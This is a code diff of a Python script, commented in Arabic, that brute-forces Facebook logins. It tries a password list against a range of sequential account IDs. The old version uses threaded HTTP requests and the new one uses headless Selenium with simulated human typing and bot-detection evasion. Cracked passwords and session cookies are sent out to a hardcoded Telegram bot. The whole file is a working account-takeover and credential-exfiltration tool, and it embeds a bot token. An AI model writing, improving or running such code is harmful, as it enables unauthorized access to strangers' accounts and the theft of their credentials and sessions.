@@ -1,78 +1,83 @@
-import os, sys, time, random, requests, threading
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-from bs4 import BeautifulSoup
+import time
+import random
+import requests
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.common.by import By
+from webdriver_manager.chrome import ChromeDriverManager
+from concurrent.futures import ThreadPoolExecutor
 
-# 🔑 إعدادات تليجرام الخاصة بك
+# 🔑 إعدادات تليجرام
 TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
 CHAT_ID = "5653032481"
 
-# 📋 قائمة كلمات المرور (50+ كلمة شائعة 2004-2005)
+# 📋 قائمة كلمات المرور المحتملة
 PASS_LIST = [
     '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
     'password', '123123', '112233', '445566', '778899', '000000', '111111', '12345',
-    'facebook', 'love123', 'king123', 'admin123', 'user123', '20042004', '20052005',
-    '654321', '321321', '1234567890', 'jasser04', 'jasser05', 'malo2004', 'malo2005'
-] + [f'123456{i}' for i in range(10)] + [f'2004{i}' for i in range(10)] + [f'2005{i}' for i in range(10)]
+    'facebook', 'love123', 'king123', '20042004', '20052005'
+] + [f'jasser{i}' for i in range(2000, 2010)]
 
-def send_to_tg(status, uid, pas, cookie=""):
-    msg = f"🔔 {status}\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookie}"
+def send_to_tg(text):
     try:
-        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg})
+        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': text})
     except: pass
 
-def get_ua():
-    """توليد User-Agent عشوائي متطور"""
-    and_v = random.choice(['9', '10', '11', '12'])
-    model = random.choice(['SM-G960F', 'SM-A515F', 'RMX2001', 'M2003J15SC'])
-    return f"Mozilla/5.0 (Linux; Android {and_v}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 120)}.0.0.0 Mobile Safari/537.36"
-
-def crack_engine(uid):
-    """محرك الفحص: تجربة كل الكلمات على حساب واحد"""
-    session = requests.Session()
-    # استخدام واجهة mbasic لفيسبوك لضمان السرعة وتجاوز الحماية
-    login_url = "https://mbasic.facebook.com/login.php"
+def check_account(uid):
+    """استخدام سيلينيوم لفحص الحساب"""
+    options = Options()
+    options.add_argument('--headless') # العمل في الخلفية
+    options.add_argument('--no-sandbox')
+    options.add_argument('--disable-dev-shm-usage')
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    options.add_argument(f'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110, 120)}.0.0.0 Safari/537.36')
     
-    for pas in PASS_LIST:
-        try:
-            head = {
-                'User-Agent': get_ua(),
-                'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Content-Type': 'application/x-www-form-urlencoded',
-            }
-            # 1. جلب حقول الأمان
-            r = session.get(login_url, headers=head, timeout=15)
-            soup = BeautifulSoup(r.text, 'html.parser')
-            form_data = {i.get("name"): i.get("value") for i in soup.find_all("input", {"type": "hidden"})}
+    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
+    
+    try:
+        for pas in PASS_LIST:
+            driver.get("https://m.facebook.com/login.php")
+            time.sleep(random.uniform(2, 4))
             
-            # 2. إضافة البيانات
-            form_data.update({"email": uid, "pass": pas})
+            # إدخال البيانات
+            driver.find_element(By.ID, "m_login_email").send_keys(uid)
+            pass_input = driver.find_element(By.NAME, "pass")
             
-            # 3. محاولة الدخول
-            res = session.post(login_url, data=form_data, headers=head, allow_redirects=False, timeout=15)
+            # محاكاة الكتابة البشرية حرف بحرف
+            for char in pas:
+                pass_input.send_keys(char)
+                time.sleep(0.1)
+                
+            driver.find_element(By.NAME, "login").click()
+            time.sleep(5)
             
-            if 'c_user' in session.cookies:
-                cookie = ";".join([f"{k}={v}" for k, v in session.cookies.items()])
-                print(f"\n✅ OK: {uid} | {pas}")
-                send_to_tg("✅ حساب ناجح (OK)", uid, pas, cookie)
+            current_url = driver.current_url
+            
+            if "c_user" in driver.get_cookies() or "home.php" in current_url:
+                cookies = "; ".join([f"{c['name']}={c['value']}" for c in driver.get_cookies()])
+                send_to_tg(f"✅ تم الاختراق (Selenium)\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookies}")
+                break
+            elif "checkpoint" in current_url:
+                send_to_tg(f"⚠️ نقطة تفتيش (CP)\n🆔 ID: {uid}\n🔑 PASS: {pas}")
                 break
             
-            elif 'checkpoint' in res.headers.get('Location', ''):
-                print(f"\n⚠️ CP: {uid} | {pas}")
-                send_to_tg("⚠️ نقطة تفتيش (CP)", uid, pas)
-                break
-        except:
-            continue
+            driver.delete_all_cookies() # تنظيف الجلسة لتجربة كلمة مرور أخرى
+            
+    except Exception as e:
+        print(f"Error checking {uid}: {e}")
+    finally:
+        driver.quit()
 
 def run_main():
     start_id = 26701173
-    total_to_check = 2000 # عدد الحسابات التي سيولدها ويفحصها
+    send_to_tg(f"🚦 بدأ التفعيل (محرك Selenium)...\n🔹 البداية من: {start_id}\n🔹 الوضع: تخفي بشري 🕵️")
     
-    print(f"🚀 بدء الفحص الجماعي المكثف من ID: {start_id}")
-    ids = [str(start_id + i) for i in range(total_to_check)]
+    ids = [str(start_id + i) for i in range(100)] # جرب 100 حساب في الدفعة الواحدة
     
-    # تشغيل 50 عملية متوازية لسرعة خيالية
-    with ThreadPool(max_workers=50) as pool:
-        pool.map(crack_engine, ids)
+    # سيلينيوم يستهلك رام عالية، لذا سنستخدم عدد خيوط أقل لضمان الاستقرار (مثلاً 5 في وقت واحد)
+    with ThreadPoolExecutor(max_workers=5) as pool:
+        pool.map(check_account, ids)
 
 if __name__ == "__main__":
     run_main()
